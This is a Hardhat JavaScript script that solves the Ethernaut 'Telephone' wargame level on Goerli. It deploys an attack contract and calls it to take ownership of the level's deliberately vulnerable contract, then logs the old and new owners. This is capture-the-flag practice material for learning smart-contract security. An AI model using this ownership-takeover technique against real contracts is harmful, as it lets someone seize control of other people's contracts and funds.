// Claim ownership of the Telephone contract

// Deployed on Goerli

const hre = require("hardhat");

async function main() {
  [macias] = await ethers.getSigners();

  // Get an instance of the contract deployed by Ethernaut
  const TelephoneAddress = "0xb11C26325D93ed781142FdC90C1c4f2000203Bed"
  this.telephone = await hre.ethers.getContractAt("Telephone",TelephoneAddress);

  // Deploy the Telephone Attack
  const TelephoneAttack = await hre.ethers.getContractFactory("TelephoneAttack");
  this.telephoneAttack = await TelephoneAttack.connect(macias).deploy(this.telephone.address);
  await this.telephoneAttack.deployed();

  console.log(
    `
    Telephone contract address: ${await this.telephone.address} \n
    Telephone original owner: ${await this.telephone.owner()}
    `
  );

  console.log(
    `Telephone contract to be attacked: ${await this.telephoneAttack.telephoneAddress()}`
    );
  
  console.log("\n\n Performing attack ... \n\n");

  // Taking ownership of the Telephone contract
  console.log("Taking ownership of the Telephone contract ...");
  const tx = await this.telephoneAttack.connect(macias).changeOwner();
  
  // Await for the tx to be mined
  console.log("Waiting for the ownership change to be mined :)");
  let txResult = await tx.wait();

  console.log("transaction " , txResult);

  console.log("\n\n Results after performing the attack \n\n");


  console.log(
    `
    Telephone contract address: ${await this.telephone.address} \n
    Telephone new owner: ${await this.telephone.owner()} \n
    Macias account's address: ${await macias.address}
    `
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});